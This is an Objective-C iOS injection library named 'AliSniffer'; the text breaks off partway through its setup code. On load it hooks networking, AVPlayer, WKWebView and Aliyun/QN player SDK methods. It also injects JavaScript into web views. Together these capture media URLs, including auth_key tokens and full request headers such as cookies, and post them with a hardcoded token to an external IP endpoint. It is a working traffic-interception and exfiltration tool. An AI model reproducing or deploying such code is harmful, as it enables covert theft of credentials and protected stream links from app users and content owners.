
// AliSniffer.m — 合并增强版（包含 Aliyun/QN hooks、AVPlayer 补充、WK MSE、NSURLProtocol、首包128KB、auth_key直通等）
// 已尽量保持兼容与安全：所有 runtime hook 在存在类/方法时才安装；低层 socket 钩子默认注释（可按需打开）。
// 请在测试环境充分验证（开启 ENABLE_DEBUG_LOG 观察日志）。

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>
#import <dlfcn.h>
#import <stdarg.h>
#import "fishhook.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// ====== 配置 ======
static NSString * const kPushRawEndpoint  = @"http://139.155.57.242:8088/api/push_raw";
static NSString * const kPushFormEndpoint = @"http://139.155.57.242:8088/api/push_form";
static NSString * const kPushToken        = @"@Yy166431";
static const NSTimeInterval kPushInterval = 3600.0;
static NSString *g_lastPlayableURL = nil;

// 调试日志
#ifndef ENABLE_DEBUG_LOG
#define LOG(...)
#else
#define LOG(...) NSLog(__VA_ARGS__)
#endif

// 弹窗开关
#ifndef SNIFFER_ENABLE_POPUP
#define SNIFFER_ENABLE_POPUP 1
#endif

// iOS16 默认关闭的敏感 Hook（按需打开）
#ifndef SNIFFER_IOS16_ENABLE_NSURLPROTOCOL
#define SNIFFER_IOS16_ENABLE_NSURLPROTOCOL 1
#endif
#ifndef SNIFFER_IOS16_ENABLE_CFREADSTREAM
#define SNIFFER_IOS16_ENABLE_CFREADSTREAM 1
#endif
#ifndef SNIFFER_IOS16_ENABLE_LIBCURL
#define SNIFFER_IOS16_ENABLE_LIBCURL 0
#endif

// 首包嗅探参数
static const NSUInteger kFirstPacketMaxBytes = 128 * 1024;
static const NSTimeInterval kFirstPacketDelayMs = 0.15;

// ====== 噪声/白名单 ======
static NSArray<NSString *> *BlockedSubstrings(void) {
    static NSArray *a; static dispatch_once_t once;
    dispatch_once(&once, ^{ a = @[@"log.aliyuncs.com/logstores", @"/beacon", @"/monitor", @"/ums", @"/umeng", @"/collect", @"bugly", @"crash", @"analytics", @"sentry"]; });
    return a;
}
static NSArray<NSString *> *WhitelistedHosts(void) {
    static NSArray *a; static dispatch_once_t once;
    dispatch_once(&once, ^{ a = @[@"knyb.kuniunet.com",@"knydb.kuniunet.com",@"qiaohongb.kuniunet.com",@"v2.weizan.cn"]; });
    return a;
}

// ====== 工具函数 ======
static inline NSString *HostOfURLString(NSString *s) {
    NSURLComponents *c = [NSURLComponents componentsWithString:s];
    return c.host.lowercaseString ?: @"";
}
static inline BOOL IsNoise(NSString *lower) {
    if (!lower) return YES;
    for (NSString *k in BlockedSubstrings()) if ([lower containsString:k]) return YES;
    return NO;
}
static inline BOOL IsPlayableBySuffixOrWhiteHost(NSString *u) {
    if (u.length == 0) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@"m3u8"] || [s containsString:@".mp4"] || [s containsString:@".flv"] ||
        [s hasPrefix:@"rtmp://"] || [s hasPrefix:@"rtmps://"] ||
        (([s hasPrefix:@"ws://"] || [s hasPrefix:@"wss://"]) && [s containsString:@".flv"])) return YES;
    NSString *h = HostOfURLString(s);
    for (NSString *w in WhitelistedHosts()) if ([h hasSuffix:w]) return YES;
    return NO;
}
static inline BOOL HasAuthKey(NSString *lower) {
    if (!lower) return NO;
    return ([lower containsString:@"auth_key="] || [lower containsString:@"authkey="]);
}
static inline NSString *BaseURLWithoutQuery(NSString *s) {
    if (!s.length) return @"";
    NSURLComponents *c = [NSURLComponents componentsWithString:s];
    if (!c) return s;
    c.query = nil; c.fragment = nil;
    return c.string ?: s;
}

// ====== 去重 ======
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static inline BOOL SeenRecently(NSString *k, NSTimeInterval sec) {
    static dispatch_once_t once; dispatch_once(&once, ^{ g_seen = [NSMutableDictionary dictionary]; });
    NSDate *now = [NSDate date]; NSDate *last = g_seen[k];
    if (last && [now timeIntervalSinceDate:last] < sec) return YES;
    g_seen[k] = now; if (g_seen.count > 4096) [g_seen removeAllObjects]; return NO;
}

// ====== 弹窗 / 复制 / 推送 ======
static inline void ShowPopupIfNeeded(NSString *title, NSString *url) {
#if SNIFFER_ENABLE_POPUP
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *msg = url ?: @"";
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            if (msg.length) [UIPasteboard generalPasteboard].string = msg;
        }]];
        [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
        UIWindow *win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
        UIViewController *vc = win.rootViewController;
        while (vc.presentedViewController) vc = vc.presentedViewController;
        if (vc) [vc presentViewController:ac animated:YES completion:nil];
    });
#else
    if (url.length) [UIPasteboard generalPasteboard].string = url;
#endif
}

static void PushLatestURL_FormFallback(NSString *u, NSDictionary *headers) {
    if (!u.length) return;
    NSURL *URL = [NSURL URLWithString:kPushFormEndpoint];
    if (!URL) return;
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:URL];
    req.HTTPMethod = @"POST";
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"application/x-www-form-urlencoded; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    NSString *hdr = @"";
    if (headers) {
        NSError *e = nil; NSData *d = [NSJSONSerialization dataWithJSONObject:headers options:0 error:&e];
        if (!e && d) hdr = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
    }
    NSString *body = [NSString stringWithFormat:@"content=%@&headers=%@",
                      [u stringByAddingPercentEncodingWithAllowedCharacters:NSCharacterSet.URLQueryAllowedCharacterSet],
                      [hdr stringByAddingPercentEncodingWithAllowedCharacters:NSCharacterSet.URLQueryAllowedCharacterSet]];
    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, __unused NSURLResponse *r, __unused NSError *e) {
        LOG(@"[AliSniffer] push_form done");
    }] resume];
}

static void PushLatestURL_Raw(NSString *u, NSDictionary *headers) {
    if (!u.length) return;
    @try {
        NSURL *URL = [NSURL URLWithString:kPushRawEndpoint];
        if (!URL) return;
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:URL];
        req.HTTPMethod = @"POST";
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        unichar nlChar = 10;
        NSString *nl = [NSString stringWithCharacters:&nlChar length:1];
        NSString *line = [u hasSuffix:nl] ? u : [u stringByAppendingString:nl];
        req.HTTPBody = [line dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
            NSHTTPURLResponse *resp = (NSHTTPURLResponse *)r;
            if (e || resp.statusCode < 200 || resp.statusCode >= 300) {
                PushLatestURL_FormFallback(u, headers);
            }
            LOG(@"[AliSniffer] push_raw (plain) -> %ld, err=%@", (long)resp.statusCode, e);
        }] resume];
    } @catch(...) {}
}

// ====== Report + Headers helper ======
static inline NSDictionary *HeadersFromRequest(NSURLRequest *req) {
    if (!req) return nil;
    NSMutableDictionary *m = [NSMutableDictionary dictionary];
    NSDictionary *h = req.allHTTPHeaderFields;
    if (h) [m addEntriesFromDictionary:h];
    if (req.URL) m[@"__url"] = req.URL.absoluteString;
    if (req.HTTPMethod) m[@"__method"] = req.HTTPMethod;
    return m;
}

static inline void ReportURL_WithHeaders(NSString *url, NSDictionary *headers) {
    if (!url.length) return;
    NSString *lower = url.lowercaseString;
    if (IsNoise(lower)) return;
    BOOL hasAuth = HasAuthKey(lower);
    BOOL playable = hasAuth || IsPlayableBySuffixOrWhiteHost(lower);
    if (!playable) return;
    NSString *baseKey = BaseURLWithoutQuery(lower);
    if (hasAuth) {
        if (SeenRecently(lower, 2.0)) return;
    } else {
        if (SeenRecently(baseKey, 10.0)) return;
    }
    g_lastPlayableURL = url;
    NSString *title = hasAuth ? @"抓到 URL (auth_key优先)" : @"抓到播放 URL";
    ShowPopupIfNeeded(title, url);
    PushLatestURL_Raw(url, headers);
}
static inline void ReportURL(NSString *url) { ReportURL_WithHeaders(url, nil); }

// ====== First packet buffer for protocol sniffing ======
@interface _FirstPacketBuffer : NSObject
@property(nonatomic,strong) NSMutableData *buf;
@property(nonatomic,copy) void (^onReady)(NSData *data);
@property(nonatomic,assign) NSTimer *timer;
- (instancetype)initWithDelay:(NSTimeInterval)delay onReady:(void(^)(NSData *d))cb;
- (void)appendData:(NSData*)d;
@end
@implementation _FirstPacketBuffer
- (instancetype)initWithDelay:(NSTimeInterval)delay onReady:(void(^)(NSData *d))cb {
    if (self = [super init]) {
        _buf = [NSMutableData data];
        _onReady = cb;
        __weak typeof(self) wself = self;
        dispatch_async(dispatch_get_main_queue(), ^{
            wself.timer = [NSTimer scheduledTimerWithTimeInterval:delay repeats:NO block:^(NSTimer * _Nonnull t) {
                __strong typeof(wself) s = wself;
                if (s && s.onReady) s.onReady(s.buf);
            }];
        });
    }
    return self;
}
- (void)appendData:(NSData*)d {
    if (!d) return;
    NSUInteger remain = kFirstPacketMaxBytes - _buf.length;
    if (remain == 0) return;
    NSUInteger take = MIN(remain, d.length);
    [_buf appendData:[d subdataWithRange:NSMakeRange(0, take)]];
}
@end

// ====== NSURLSessionTask resume hook (抓 headers) ======
static void (*orig_task_resume)(id, SEL);
static void swz_task_resume(id self, SEL _cmd) {
    @try {
        NSURLRequest *req = nil;
        if ([self respondsToSelector:@selector(currentRequest)]) req = [self performSelector:@selector(currentRequest)];
        else if ([self respondsToSelector:@selector(originalRequest)]) req = [self performSelector:@selector(originalRequest)];
        NSString *u = req.URL.absoluteString;
        NSDictionary *hdr = HeadersFromRequest(req);
        if (u.length) ReportURL_WithHeaders(u, hdr);
    } @catch(...) {}
    if (orig_task_resume) orig_task_resume(self, _cmd);
}

// ====== NSURLProtocol 扩展（大首包 + headers + WS upgrade 检测） ======
@interface _SniffProto : NSURLProtocol <NSURLSessionDataDelegate>
@property(nonatomic,strong) NSURLSessionDataTask *task;
@property(nonatomic,strong) _FirstPacketBuffer *first;
@property(nonatomic,assign) BOOL shouted;
@property(nonatomic,strong) NSDictionary *reqHeaders;
@end
@implementation _SniffProto
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    if ([NSURLProtocol propertyForKey:@"_SniffDone" inRequest:request]) return NO;
    NSString *scheme = request.URL.scheme.lowercaseString;
    return [scheme isEqualToString:@"http"] || [scheme isEqualToString:@"https"];
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }
- (void)startLoading {
    NSMutableURLRequest *r = [self.request mutableCopy];
    [NSURLProtocol setProperty:@YES forKey:@"_SniffDone" inRequest:r];
    self.reqHeaders = HeadersFromRequest(r);
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg delegate:self delegateQueue:nil];
    self.task = [s dataTaskWithRequest:r];
    __weak typeof(self) w = self;
    self.first = [[_FirstPacketBuffer alloc] initWithDelay:kFirstPacketDelayMs onReady:^(NSData *d) {
        __strong typeof(w) sself = w;
        if (!sself) return;
        NSString *text = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        if (text && ([text containsString:@"#EXTM3U"] || [text containsString:@"#EXT-X-PART"] || [text containsString:@"#EXT-X-MAP"])) {
            ReportURL_WithHeaders(sself.task.currentRequest.URL.absoluteString, sself.reqHeaders);
            sself.shouted = YES;
            return;
        }
        const uint8_t *bytes = (const uint8_t *)d.bytes; NSUInteger n = d.length;
        if (n >= 376) {
            BOOL looksTS = (bytes[0] == 0x47) && (bytes[188] == 0x47 || (n > 2*188 && bytes[2*188] == 0x47));
            if (looksTS) { ReportURL_WithHeaders(sself.task.currentRequest.URL.absoluteString, sself.reqHeaders); sself.shouted = YES; return; }
        }
        if (n >= 12) {
            for (NSUInteger i=0;i+8<=MIN(n,4096);i++) {
                if (bytes[i+4]=='f' && bytes[i+5]=='t' && bytes[i+6]=='y' && bytes[i+7]=='p') { ReportURL_WithHeaders(sself.task.currentRequest.URL.absoluteString, sself.reqHeaders); sself.shouted = YES; break; }
                if (bytes[i+4]=='m' && bytes[i+5]=='o' && bytes[i+6]=='o' && bytes[i+7]=='f') { ReportURL_WithHeaders(sself.task.currentRequest.URL.absoluteString, sself.reqHeaders); sself.shouted = YES; break; }
            }
        }
    }];
    [self.task resume];
}
- (void)stopLoading { [self.task cancel]; self.task = nil; self.first = nil; }
- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition))completionHandler {
    [self.client URLProtocol:self didReceiveResponse:response cacheStoragePolicy:NSURLCacheStorageNotAllowed];
    if (!self.shouted) {
        NSString *mime = response.MIMEType.lowercaseString ?: @"";
        if ([mime containsString:@"mpegurl"] || [mime containsString:@"x-flv"] || [mime containsString:@"/flv"]) { ReportURL_WithHeaders(dataTask.currentRequest.URL.absoluteString, self.reqHeaders); self.shouted = YES; }
    }
    completionHandler(NSURLSessionResponseAllow);
}
- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
    [self.client URLProtocol:self didLoadData:data];
    if (self.shouted) return;
    [self.first appendData:data];
}
- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error) [self.client URLProtocol:self didFailWithError:error];
    else [self.client URLProtocolDidFinishLoading:self];
}
@end

// 插入 protocol 到 session config
static NSURLSessionConfiguration* (*orig_defCfg)(id, SEL);
static NSURLSessionConfiguration* swz_defCfg(id self, SEL _cmd) {
    NSURLSessionConfiguration *cfg = orig_defCfg ? orig_defCfg(self, _cmd) : [NSURLSessionConfiguration defaultSessionConfiguration];
    NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
    if (![arr containsObject:_SniffProto.class]) [arr insertObject:_SniffProto.class atIndex:0];
    cfg.protocolClasses = arr; return cfg;
}
static NSURLSessionConfiguration* (*orig_ephCfg)(id, SEL);
static NSURLSessionConfiguration* swz_ephCfg(id self, SEL _cmd) {
    NSURLSessionConfiguration *cfg = orig_ephCfg ? orig_ephCfg(self, _cmd) : [NSURLSessionConfiguration ephemeralSessionConfiguration];
    NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
    if (![arr containsObject:_SniffProto.class]) [arr insertObject:_SniffProto.class atIndex:0];
    cfg.protocolClasses = arr; return cfg;
}

// ====== CFReadStream hook (保留) ======
typedef CFURLRef (*PFN_CFHTTPMessageCopyRequestURL)(CFHTTPMessageRef);
static PFN_CFHTTPMessageCopyRequestURL p_CFHTTPMessageCopyRequestURL = NULL;
typedef CFReadStreamRef (*PFN_CFReadStreamCreateForHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef);
static PFN_CFReadStreamCreateForHTTPRequest orig_CFReadStreamCreateForHTTPRequest = NULL;
static CFReadStreamRef hook_CFReadStreamCreateForHTTPRequest(CFAllocatorRef a, CFHTTPMessageRef req) {
    if (req && p_CFHTTPMessageCopyRequestURL) {
        CFURLRef u = p_CFHTTPMessageCopyRequestURL(req);
        if (u) {
            NSString *s = [(__bridge NSURL *)u absoluteString];
            if (s.length) ReportURL_WithHeaders(s, nil);
        }
    }
    return orig_CFReadStreamCreateForHTTPRequest ? orig_CFReadStreamCreateForHTTPRequest(a, req) : NULL;
}

// ====== AVPlayer / AVURLAsset hooks ======
static id (*orig_AVPI_initWithURL)(id, SEL, NSURL *);
static id swz_AVPI_initWithURL(id self, SEL _cmd, NSURL *url) { if (url) ReportURL_WithHeaders(url.absoluteString, nil); return orig_AVPI_initWithURL(self, _cmd, url); }
static id (*orig_AVPI_playerItemWithURL)(id, SEL, NSURL *);
static id swz_AVPI_playerItemWithURL(id self, SEL _cmd, NSURL *url) { if (url) ReportURL_WithHeaders(url.absoluteString, nil); return orig_AVPI_playerItemWithURL(self, _cmd, url); }
static id (*orig_AVURLA_initWithURL)(id, SEL, NSURL *, NSDictionary *);
static id swz_AVURLA_initWithURL(id self, SEL _cmd, NSURL *url, NSDictionary *opt) { if (url) ReportURL_WithHeaders(url.absoluteString, nil); return orig_AVURLA_initWithURL(self, _cmd, url, opt); }
static id (*orig_AVURLA_assetWithURL)(id, SEL, NSURL *, NSDictionary *);
static id swz_AVURLA_assetWithURL(id self, SEL _cmd, NSURL *url, NSDictionary *opt) { if (url) ReportURL_WithHeaders(url.absoluteString, nil); return orig_AVURLA_assetWithURL(self, _cmd, url, opt); }

static void (*orig_replaceCurrentItem)(id, SEL, id);
static void swz_replaceCurrentItem(id self, SEL _cmd, id item) {
    @try {
        NSURL *u = nil;
        if ([item respondsToSelector:@selector(URL)]) u = [item performSelector:@selector(URL)];
        else if ([item respondsToSelector:@selector(asset)]) {
            id asset = [item performSelector:@selector(asset)];
            if ([asset respondsToSelector:@selector(URL)]) u = [asset performSelector:@selector(URL)];
        }
        if (u) ReportURL_WithHeaders(u.absoluteString, nil);
    } @catch(...) {}
    if (orig_replaceCurrentItem) orig_replaceCurrentItem(self, _cmd, item);
}

static void (*orig_playImmediatelyAtRate)(id, SEL, float);
static void swz_playImmediatelyAtRate(id self, SEL _cmd, float r) {
    @try {
        if ([self respondsToSelector:@selector(currentItem)]) {
            id item = [self performSelector:@selector(currentItem)];
            NSURL *u = nil;
            if ([item respondsToSelector:@selector(URL)]) u = [item performSelector:@selector(URL)];
            else if ([item respondsToSelector:@selector(asset)]) {
                id asset = [item performSelector:@selector(asset)];
                if ([asset respondsToSelector:@selector(URL)]) u = [asset performSelector:@selector(URL)];
            }
            if (u) ReportURL_WithHeaders(u.absoluteString, nil);
        }
    } @catch(...) {}
    if (orig_playImmediatelyAtRate) orig_playImmediatelyAtRate(self, _cmd, r);
}

// ====== WK Injection: fetch/XHR + MSE appendBuffer sampling ======
@interface _WK_MSE_Handler : NSObject <WKScriptMessageHandler> @end
@implementation _WK_MSE_Handler
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if (!message.body) return;
    @try {
        if ([message.body isKindOfClass:[NSDictionary class]]) {
            NSDictionary *b = (NSDictionary*)message.body;
            NSString *type = b[@"type"];
            if ([type isEqualToString:@"url"]) {
                NSString *u = b[@"u"]; if (u.length) ReportURL_WithHeaders(u, nil);
            } else if ([type isEqualToString:@"mse_sample"]) {
                // We receive base64 sample - can upload or log for analysis
                NSString *page = b[@"page"] ?: @"";
                NSString *b64 = b[@"data"] ?: @"";
                LOG(@"[AliSniffer] MSE sample from %@ len=%lu", page, (unsigned long)b64.length);
                // Optionally upload sample (omitted by default)
            }
        } else {
            NSString *s = [message.body description];
            if (s.length) ReportURL_WithHeaders(s, nil);
        }
    } @catch(...) {}
}
@end

static id (*orig_WK_init)(id, SEL, CGRect, WKWebViewConfiguration *);
static id swz_WK_init(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *cfg) {
    if (cfg) {
        _WK_MSE_Handler *h = [_WK_MSE_Handler new];
        [cfg.userContentController addScriptMessageHandler:h name:@"_ALISNIF"];
        NSString *js =
        @"(function(){"
         "function postUrl(u){try{window.webkit.messageHandlers._ALISNIF.postMessage({type:'url',u:u});}catch(e){}}"
         "var _fetch = window.fetch; if(_fetch){window.fetch = function(){try{var u=arguments[0]; if(typeof u==='string') postUrl(u);}catch(e){} return _fetch.apply(this,arguments);} }"
         "var _open = XMLHttpRequest.prototype.open; XMLHttpRequest.prototype.open = function(method,url){try{postUrl(url);}catch(e){} return _open.apply(this,arguments)};"
         "try{ if(window.MediaSource){"
             "var OrigAdd = MediaSource.prototype.addSourceBuffer;"
             "MediaSource.prototype.addSourceBuffer = function(mime){"
                 "var sb = OrigAdd.call(this,mime);"
                 "var origAppend = sb.appendBuffer;"
                 "sb.appendBuffer = function(buf){"
                     "try{ var view = new Uint8Array(buf); var len = Math.min(256, view.length); var arr = view.slice(0,len); var s=''; for(var i=0;i<arr.length;i++){s+=String.fromCharCode(arr[i]);} var b64 = btoa(s); var page=document.location.href; window.webkit.messageHandlers._ALISNIF.postMessage({type:'mse_sample', page:page, data:b64}); }catch(e){}; return origAppend.apply(this, arguments); };"
                 "return sb; }; } }catch(e){}"
        "})();";
        WKUserScript *sc = [[WKUserScript alloc] initWithSource:js injectionTime:WKUserScriptInjectionTimeAtDocumentStart forMainFrameOnly:NO];
        [cfg.userContentController addUserScript:sc];
        objc_setAssociatedObject(cfg, "_alisnif_handler", h, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
        objc_setAssociatedObject(cfg, "_alisnif_script", sc, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    }
    return orig_WK_init ? orig_WK_init(self, _cmd, frame, cfg) : self;
}

// ====== Aliyun / QN / common SDK hooks (Install functions) ======
static IMP orig_Ali_setUrl = NULL;
static void swz_Ali_setUrl(id self, SEL _cmd, id urlObj) {
    @try {
        NSString *u = nil;
        if ([urlObj isKindOfClass:[NSString class]]) u = urlObj;
        else if ([urlObj isKindOfClass:[NSURL class]]) u = [(NSURL*)urlObj absoluteString];
        if (u && u.length) ReportURL_WithHeaders(u, nil);
    } @catch(...) {}
    if (orig_Ali_setUrl) ((void(*)(id, SEL, id))orig_Ali_setUrl)(self, _cmd, urlObj);
}

static void InstallAliyunHooks(void) {
    NSArray *cands = @[@"AliyunVodPlayer", @"AliyunPlayer", @"AliPlayer", @"AliyunVodPlayerManager", @"AliyunMediaDownloader"];
    for (NSString *cname in cands) {
        Class c = NSClassFromString(cname);
        if (!c) continue;
        SEL sel = sel_registerName("setUrl:");
        Method m = class_getInstanceMethod(c, sel);
        if (m) {
            orig_Ali_setUrl = method_getImplementation(m);
            method_setImplementation(m, (IMP)swz_Ali_setUrl);
            LOG(@"[AliSniffer] hooked %s setUrl:", cname.UTF8String);
        }
        SEL sel2 = sel_registerName("setDataSource:");
        Method m2 = class_getInstanceMethod(c, sel2);
        if (m2) { method_setImplementation(m2, (IMP)swz_Ali_setUrl); LOG(@"[AliSniffer] hooked %s setDataSource:", cname.UTF8String); }
        // try prepare/start
        SEL sel3 = sel_registerName("prepare");
        Method m3 = class_getInstanceMethod(c, sel3);
        if (m3) {
            IMP origImp = method_getImplementation(m3);
            // implement wrapper
            IMP newImp = imp_implementationWithBlock(^(id _self){
                @try {
                    NSString *u = nil;
                    if ([_self respondsToSelector:@selector(url)]) u = [_self performSelector:@selector(url)];
                    if (!u && [_self respondsToSelector:@selector(currentURL)]) u = [_self performSelector:@selector(currentURL)];
                    if (u) ReportURL_WithHeaders(u, nil);
                } @catch(...) {}
                if (origImp) ((void(*)(id, SEL))origImp)(_self, sel3);
            });
            method_setImplementation(m3, newImp);
            LOG(@"[AliSniffer] hooked %s prepare", cname.UTF8String);
        }
    }
}

static void InstallQNHooks(void) {
    NSArray *cands = @[@"QNPlayer", @"QNLivePlayer", @"KSYPlayer", @"PLPlayer", @"IJKFFMoviePlayerController", @"KSYMoviePlayerController"];
    for (NSString *cname in cands) {
        Class c = NSClassFromString(cname);
        if (!c) continue;
        SEL sel = sel_registerName("setUrl:");
        Method m = class_getInstanceMethod(c, sel);
        if (m) {
            IMP orig = method_getImplementation(m);
            IMP newImp = imp_implementationWithBlock(^(id _self, id urlObj){
                @try {
                    NSString *u = nil;
                    if ([urlObj isKindOfClass:[NSString class]]) u = urlObj;
                    else if ([urlObj isKindOfClass:[NSURL class]]) u = [(NSURL*)urlObj absoluteString];
                    if (u) ReportURL_WithHeaders(u, nil);
                } @catch(...) {}
                if (orig) ((void(*)(id, SEL, id))orig)(_self, sel, urlObj);
            });
            method_setImplementation(m, newImp);
            LOG(@"[AliSniffer] hooked %s setUrl:", cname.UTF8String);
        }
        // try start/open/play selectors
        NSArray *other = @[@"startPlay", @"start", @"open", @"prepareToPlay", @"play"];
        for (NSString *sname in other) {
            SEL s = sel_registerName(sname.UTF8String);
            Method mm = class_getInstanceMethod(c, s);
            if (mm) {
                IMP orig2 = method_getImplementation(mm);
                IMP new2 = imp_implementationWithBlock(^(id _self){
                    @try {
                        // attempt read url property
                        NSString *u = nil;
                        if ([_self respondsToSelector:@selector(url)]) u = [_self performSelector:@selector(url)];
                        if (!u && [_self respondsToSelector:@selector(currentURL)]) u = [_self performSelector:@selector(currentURL)];
                        if (u) ReportURL_WithHeaders(u, nil);
                    } @catch(...) {}
                    if (orig2) ((void(*)(id, SEL))orig2)(_self, s);
                });
                method_setImplementation(mm, new2);
                LOG(@"[AliSniffer] hooked %s %@", cname.UTF8String, sname);
            }
        }
    }
}

// ====== Optional: low-level socket send hook (commented out by default) ======
// typedef ssize_t (*orig_send_fn)(int, const void*, size_t, int);
// static orig_send_fn orig_send = NULL;
// ssize_t hook_send(int sockfd, const void *buf, size_t len, int flags) {
//     if (buf && len>0) {
//         size_t n = len < 512 ? len : 512;
//         const char *cbuf = (const char*)buf;
//         if (n>=4 && (memcmp(cbuf, "GET ", 4) == 0 || memmem(buf, n, "FLV", 3) || memmem(buf, n, "#EXTM3U", 7) || memmem(buf, n, "ftyp", 4))) {
//             struct sockaddr_in addr; socklen_t addrlen = sizeof(addr);
//             if (getpeername(sockfd, (struct sockaddr*)&addr, &addrlen) == 0) {
//                 char ipa[64]; inet_ntop(AF_INET, &addr.sin_addr, ipa, sizeof(ipa));
//                 int port = ntohs(addr.sin_port);
//                 NSString *pseudo = [NSString stringWithFormat:@"socket://%s:%d (payload-hint)", ipa, port];
//                 ReportURL_WithHeaders(pseudo, nil);
//             } else {
//                 ReportURL_WithHeaders(@"socket://(unknown) (payload-hint)", nil);
//             }
//         }
//     }
//     return orig_send(sockfd, buf, len, flags);
// }

// ====== Install hooks in constructor ======
__attribute__((constructor))
static void _alisniffer_init(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            // NSURLSessionTask resume
            Class Task = NSClassFromString(@"NSURLSessionTask");
            if (Task && class_getInstanceMethod(Task, @selector(resume))) {
                Method m = class_getInstanceMethod(Task, @selector(resume));
                orig_task_resume = (void *)method_getImplementation(m);
                method_setImplementation(m, (IMP)swz_task_resume);
                LOG(@"[AliSniffer] hooked NSURLSessionTask resume");
            }

            // NSURLSessionConfiguration -> NSURLProtocol 插入
            Class Cfg = NSClassFromString(@"NSURLSessionConfiguration");
            if (Cfg) {
                Method m1 = class_getClassMethod(Cfg, @selector(defaultSessionConfiguration));
                if (m1) { orig_defCfg = (void *)method_getImplementation(m1); method_setImplementation(m1, (IMP)swz_defCfg); }
                Method m2 = class_getClassMethod(Cfg, @selector(ephemeralSessionConfiguration));
                if (m2) { orig_ephCfg = (void *)method_getImplementation(m2); method_setImplementation(m2, (IMP)swz_ephCfg); }
                LOG(@"[AliSniffer] hooked NSURLSessionConfiguration to inject NSURLProtocol");
            }

            // CFReadStream hook via fishhook (if available)
            void *hCF = dlopen("/System/Library/Frameworks/CFNetwork.framework/CFNetwork", RTLD_NOW);
            if (hCF) {
                p_CFHTTPMessageCopyRequestURL = (PFN_CFHTTPMessageCopyRequestURL)dlsym(hCF, "CFHTTPMessageCopyRequestURL");
                rebind_symbols((struct rebinding[]){{"CFReadStreamCreateForHTTPRequest",(void*)hook_CFReadStreamCreateForHTTPRequest,(void**)&orig_CFReadStreamCreateForHTTPRequest}},1);
                LOG(@"[AliSniffer] CFReadStream hook installed");
            }

            // AVPlayer / AVURLAsset hooks
            Class AVPI = NSClassFromString(@"AVPlayerItem");
            if (AVPI) {
                Method m1 = class_getInstanceMethod(AVPI, @selector(initWithURL:));
                if (m1) { orig_AVPI_initWithURL = (void *)method_getImplementation(m1); method_setImplementation(m1, (IMP)swz_AVPI_initWithURL); }
                Method m2 = class_getClassMethod(AVPI, @selector(playerItemWithURL:));
                if (m2) { orig_AVPI_playerItemWithURL = (void *)method_getImplementation(m2); method_setImplementation(m2, (IMP)swz_AVPI_playerItemWithURL); }
                LOG(@"[AliSniffer] AVPlayerItem hooks installed");
            }
            Class AVURLA = NSClassFromString(@"AVURLAsset");
            if (AVURLA) {
                Method m3 = class_getInstanceMethod(AVURLA, @selector(initWithURL:options:));
                if (m3) { orig_AVURLA_initWithURL = (void *)method_getImplementation(m3); method_setImplementation(m3, (IMP)swz_AVURLA_initWithURL); }
                Method m4 = class_getClassMethod(AVURLA, @selector(URLAssetWithURL:options:));
                if (m4) { orig_AVURLA_assetWithURL = (void *)method_getImplementation(m4); method_setImplementation(m4, (IMP)swz_AVURLA_assetWithURL); }
            }
            Class AVP = NSClassFromString(@"AVPlayer");
            if (AVP) {
                Method mr = class_getInstanceMethod(AVP, @selector(replaceCurrentItemWithPlayerItem:));
                if (mr) { orig_replaceCurrentItem = (void *)method_getImplementation(mr); method_setImplementation(mr, (IMP)swz_replaceCurrentItem); }
                Method mp = class_getInstanceMethod(AVP, @selector(playImmediatelyAtRate:));
                if (mp) { orig_playImmediatelyAtRate = (void *)method_getImplementation(mp); method_setImplementation(mp, (IMP)swz_playImmediatelyAtRate); }
                LOG(@"[AliSniffer] AVPlayer replace/play hooks installed");
            }

            // WKWebView injection
            Class WK = NSClassFromString(@"WKWebView");
            if (WK) {
                Method mi = class_getInstanceMethod(WK, @selector(initWithFrame:configuration:));
